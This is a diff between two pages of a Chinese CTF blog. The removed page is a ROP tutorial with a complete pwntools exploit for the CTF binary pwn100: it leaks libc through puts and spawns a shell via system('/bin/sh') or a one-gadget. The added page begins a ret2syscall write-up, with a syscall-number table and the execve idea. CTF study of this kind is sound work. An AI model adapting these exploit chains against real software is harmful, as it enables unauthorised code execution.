@@ -1,11 +1,7 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="ROP技术, Du4t~~~~">
-    <meta name="description" content="
-学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识
-
-什么是ROP在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP 
-ROP存在的价值就是 当我">
+    <meta name="keywords" content="基于栈溢出的ret2syscall学习, Du4t~~~~">
+    <meta name="description" content="最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +9,7 @@ ROP存在的价值就是 当我">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ROP技术 | Du4t的博客</title>
+    <title>基于栈溢出的ret2syscall学习 | Du4t的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -304,13 +300,13 @@ ROP存在的价值就是 当我">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        ROP技术
+                        基于栈溢出的ret2syscall学习
                     </div>
                 </div>
             </div>
@@ -446,21 +442,21 @@ ROP存在的价值就是 当我">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:  
-                    2019-11-16
+                    2020-01-12
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        849
+                        623
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        3 分
+                        2 分
                     </div>
                     
                 
@@ -476,79 +472,40 @@ ROP存在的价值就是 当我">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><blockquote>
-<p>学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识</p>
-</blockquote>
-<h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP </p>
-<p>ROP存在的价值就是 当我们不能直接利用返回地址Getshell的时候 我们可以通过一个ROP链 将Getshell时缺少的条件补全 或者拿到一些必要的信息</p>
+                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><p>最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的学习 </p>
+<h2 id="系统调用的原理"><a href="#系统调用的原理" class="headerlink" title="系统调用的原理"></a>系统调用的原理</h2><p>其实栈溢出的系统调用没有那么高大上..起码我觉得没有栈迁移高大上….栈在乱飞..想想就觉得高级…栈溢出的西永调用主要是利用了一个系统层面的中断<code>int 0x80</code> 利用<code>int 0x80</code>来使程序陷入核心 然后将参数通过寄存器传往核心 具体调用的系统函数就是由系统调用号来决定 内核的中断处理机制会根据系统调用号 然后调用响应的内核函数 也就是系统调用 而栈溢出最终目的通常都是Getshell 那么观察一下所有的系统调用号 就会发现有一个我们的老面孔<code>execve</code> 其实之前执行的<code>system('/bin/sh)</code>的真实形态执行的就是 <code>execve('/bin/sh')</code></p>
 <blockquote>
-<p>例如 函数表内没有system 或者 程序内没有/bin/sh 这种尴尬的情况</p>
+<p>关于前20个32位系统的系统调用号如下 别问…问就是懒…</p>
+<p>#ifndef _ASM_X86_UNISTD_32_H</p>
+<p>#define _ASM_X86_UNISTD_32_H 1</p>
+<p>#define __NR_restart_syscall 0</p>
+<p>#define __NR_exit 1</p>
+<p>#define __NR_fork 2</p>
+<p>#define __NR_read 3</p>
+<p>#define __NR_write 4</p>
+<p>#define __NR_open 5</p>
+<p>#define __NR_close 6</p>
+<p>#define __NR_waitpid 7</p>
+<p>#define __NR_creat 8</p>
+<p>#define __NR_link 9</p>
+<p>#define __NR_unlink 10</p>
+<p>#define __NR_execve 11</p>
+<p>#define __NR_chdir 12</p>
+<p>#define __NR_time 13</p>
+<p>#define __NR_mknod 14</p>
+<p>#define __NR_chmod 15</p>
+<p>#define __NR_lchown 16</p>
+<p>#define __NR_break 17</p>
+<p>#define __NR_oldstat 18</p>
+<p>#define __NR_lseek 19</p>
+<p>#define __NR_getpid 20</p>
 </blockquote>
-<h2 id="实现ROP的条件"><a href="#实现ROP的条件" class="headerlink" title="实现ROP的条件"></a>实现ROP的条件</h2><p>ROP对程序执行次数没有要求 因为即使程序仅执行一次 我们依旧可以在ROP链中 将主函数的地址添加进去 让程序返回到主函数处 所以不要求程序执行次数 但是实现ROP最基本的要求就是程序存在栈溢出 即我们能溢出到函数返回地址的位置 </p>
-<h2 id="通常ROP的思路"><a href="#通常ROP的思路" class="headerlink" title="通常ROP的思路"></a>通常ROP的思路</h2><p>通常来说ROP思路基本固定 主要是以下两种</p>
-<p>1.puts_plt+main_addr+puts_got </p>
-<p>(输出puts函数的真实地址 用于泄漏Libc 且最后返回主函数 达成二次利用 [仅适用32位程序] )</p>
-<p>2.pop_rdi_addr+puts_got+puts_plt+main_addr</p>
-<p>(作用同上 但是这个ROP链适用于64位程序)</p>
-<p>其中的函数名是可以换的 直接替换成适合的函数即可</p>
-<h2 id="样例-攻防世界-进阶区-pwn100"><a href="#样例-攻防世界-进阶区-pwn100" class="headerlink" title="样例(攻防世界-进阶区-pwn100)"></a>样例(攻防世界-进阶区-pwn100)</h2><p>首先万年雷同起手式</p>
-<p><img src="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" alt></p>
-<p>拖入IDA 发现程序主要的逻辑就是读入200个字符 然后结束 发现在读入时存在栈溢出 程序仅执行一次且程序函数表没有system函数 此时考虑使用ROP</p>
-<p><img src="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" alt></p>
-<p>通过观察函数表 发现程序使用过puts函数 决定使用puts函数作为基础 使用ROP技术</p>
-<p>首先因为是64位程序 我们需要将参数puts_got给整到寄存器RDI中 这样才能正常调用 这是我使用的是ROPgadget 这个工具来查找适合的函数 </p>
-<p><img src="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" alt></p>
-<p>确定0x400763存在我们需要的函数 那么我们就可以直接构造我们需要的ROP链了</p>
-<blockquote>
-<p>填充字符+pop_rdi_addr+puts_got+puts_plt+main_addr</p>
+<p>那么其实思路也很明确 既然整个程序没有地方能够泄漏libc 也没有system能Getshell 那么唯一的办法就是自己创造一个可以执行系统命令的环境出来 这时候我们需要了解到 <code>execve</code>函数的函数原型 即调用方法</p>
+<h3 id="execve函数的函数原型"><a href="#execve函数的函数原型" class="headerlink" title="execve函数的函数原型"></a>execve函数的函数原型</h3><p><code>execve('执行命令的地址',NULL,NULL)</code> </p>
+<h2 id="关于利用系统调用手法的实例"><a href="#关于利用系统调用手法的实例" class="headerlink" title="关于利用系统调用手法的实例"></a>关于利用系统调用手法的实例</h2><blockquote>
+<p>这里采用的实例和CTFWiki一样 使用bamboofox中的ret2syscall为例 </p>
 </blockquote>
-<p>给出脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#sh=remote("111.198.29.45","42072")</span>
-file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"pwn100"</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.23-0ubuntu10_amd64.so"</span><span class="token punctuation">)</span>
-
-puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-pop_addr<span class="token operator">=</span><span class="token number">0x0000000000400763</span>
-read_addr<span class="token operator">=</span><span class="token number">0x40063D</span>
-
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span>
-puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span><span class="token string">'0x'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-puts_got<span class="token operator">=</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>int<span class="token punctuation">(</span>puts_got<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-one_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x45216</span>
-<span class="token comment" spellcheck="true"># gdb.attach(sh)</span>
-<span class="token comment" spellcheck="true"># pause()</span>
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x47</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
-payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>执行即可getshell</p>
-<p><img src="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" alt></p>
-<h2 id="样例-攻防世界-进阶区-welpwn"><a href="#样例-攻防世界-进阶区-welpwn" class="headerlink" title="样例(攻防世界-进阶区-welpwn)"></a>样例(攻防世界-进阶区-welpwn)</h2><blockquote>
-<p>第一次看见这个标题的时候以为是pwn的入门题..果然被骗了！</p>
-</blockquote>
-<p>老样子 先正常起手式</p>
-<p><img src="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" alt></p>
-<p>载入IDA 发现特别迷幻的地方 似乎整个程序都没有洞… 尝试动态调试下吧</p>
+<p>首先 下载附件之后 老样子 先查保护 发现几乎保护都没开…</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -725,8 +682,8 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 </a>
             </div>
             <br>
-            <a href="/2019/11/16/rop-ji-zhu/">
-                    《ROP技术》
+            <a href="/2020/01/12/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/">
+                    《基于栈溢出的ret2syscall学习》
             </a> 由
             <a href="http://Du4t.github.io">
                 Du4t
@@ -771,50 +728,32 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i> 上一篇</div>
             <div class="card">
-                <a href="/2019/11/28/njupt-ctf/">
+                <a href="/2020/01/13/zip-bao-po/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="NJUPT_CTF-WP">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ZIP爆破脚本">
                         
-                        <span class="card-title">NJUPT_CTF-WP</span>
+                        <span class="card-title">ZIP爆破脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            hello_pwn提示 Do you know pwntools? 直接用pwntools 连上去就出flag
-
-pwn_me_100_years (I)查保护
-
-拖入IDA 
-
-简单解释下逻辑 就是当0x6010c0地址处的值等于0x66
+                            Readme也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-11-28
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-13
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/WP/" class="post-category">
-                                    WP
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Du4t
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/WP/">
-                        <span class="chip bg-color">WP</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -826,25 +765,24 @@ pwn_me_100_years (I)查保护
                 下一篇 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/">
+                <a href="/2019/12/15/uaf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="如何泄漏PWN中的一些信息">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="UAF漏洞生成原理及利用">
                         
-                        <span class="card-title">如何泄漏PWN中的一些信息</span>
+                        <span class="card-title">UAF漏洞生成原理及利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            敏感函数一般来说 所有有向屏幕输出功能的函数都有泄漏Libc的可能 但是主要用到还是以下几个函数
-putsputs函数嘛…我们的老常客..大部分漏洞都会用到它 需要注意的是 puts的截断标准是遇到 \0 即从某个地址开始一直输出 直到遇到
+                            UAF漏洞生成原因UAF漏洞全称为Use After Free 从字面意思上都能理解是在程序Free掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-15
                             </span>
                         <span class="publish-author">
                             
